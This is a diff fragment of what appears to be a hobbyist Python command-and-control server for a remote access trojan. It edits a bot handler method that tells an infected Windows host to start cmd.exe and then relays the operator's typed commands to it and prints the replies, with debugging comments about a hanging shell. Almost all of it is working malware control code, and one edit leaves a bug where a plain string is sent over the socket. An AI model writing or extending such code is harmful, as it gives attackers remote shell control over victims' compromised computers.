@@ -101,26 +101,30 @@ class Handler(threading.Thread):
         #   We need to figure out a way to capture the shell keyword here, then send it over, while also realizing in the c2
         #   that we are going to be sending and receiving directly to and from the cmd.exe process, effectively needing a function, loop, or just to catch and exit twice[?]
         #     
-
+        #--------
+        # Current problem:
+        #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
+        #   banner and another for the initial shell/cwd output prompt). After that, 
 
         # Initiate shell 
         try:
-            self.client.send(("shell").encode('utf-8'))
+            self.client.send(("shell"))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
         except Exception as ex:
             print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
-            return False
+            return False                            # unsuccessful
         else:
-            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
+            recvVal = self.client.recv(2048)        # Receive reply from RAT
             print(recvVal)
-            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
-            print(recvVal)
-    
-        while (True):
+            #recvVal = self.client.recv(2048))      # Second here because only the Microsoft banner was being sent. 
+                                                    # Adding this captures the CWD prompt
+            #print(recvVal)
+            
+        while (True):                                                           # Capture IO sent over socket (cmd.exe)
             try:
-                cmd = str(input())
+                cmd = str(input())                                              # Dumb capture in
             except Exception as ex:
-                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")
+                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
                 print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             else:
                 try:
@@ -128,18 +132,18 @@ class Handler(threading.Thread):
                     #     self.client.send("exit".encode('utf-8'))
                     #     break
                     # else:
-                    self.client.send(cmd.encode('utf-8'))
-                    print(f"--data being sent = {cmd}")
+                    self.client.send(cmd.encode('utf-8'))                       # Encode input then send
+                    print(f"--data being sent = {cmd}")                         # ping for send stage
                 except Exception as ex:
-                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
+                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                     print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                 else:
-                    print("--reached receive--")
-                    recvVal = (self.client.recv(4096)).decode('utf-8')      # Receive reply from RAT
-                    print("--printing recv--")
-                    print(recvVal)
-                    
-            print("==exiting loop iteration==")
+                    print("--reached receive--")                                # ping for recv stage
+                    recvVal = (self.client.recv(2048)).decode('utf-8')          # Receive reply from RAT
+                    print("--printing recv--")                                  # ping for non-hanging return
+                    print(recvVal)                                              # content-received
+
+            print("==exiting loop iteration==")                                 # ping for iterative finish
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
         return True
